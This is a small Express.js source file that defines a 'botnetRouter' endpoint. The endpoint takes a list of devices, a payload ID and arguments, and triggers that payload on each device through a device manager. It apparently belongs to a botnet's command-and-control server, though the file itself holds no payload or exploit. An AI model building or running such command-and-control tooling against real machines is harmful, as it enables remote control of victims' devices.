const express = require('express');
const botnetManager = require('../socket/deviceManager');

const botnetRouter = express.Router();

botnetRouter
    .post("/", (req, res) => {
        const devices = req.body.devices;
        const payloadId = req.body.payload_id;
        const payloadArgs = req.body.payload_args;

        if (payloadId) {
            const promises = [];
            devices.forEach(device => {
                promises.push(botnetManager.triggerDevice(device.device, payloadId, payloadArgs));
            })
            Promise.all(promises)
                .then(values => {
                    res.json(values);
                })
                .catch( error => {
                    res.status(500).json({error: "error on execution"});
                })
        } else {
            res.status(401).json({error: "Missing payload_id body parameter"});
        }
    })

module.exports = botnetRouter;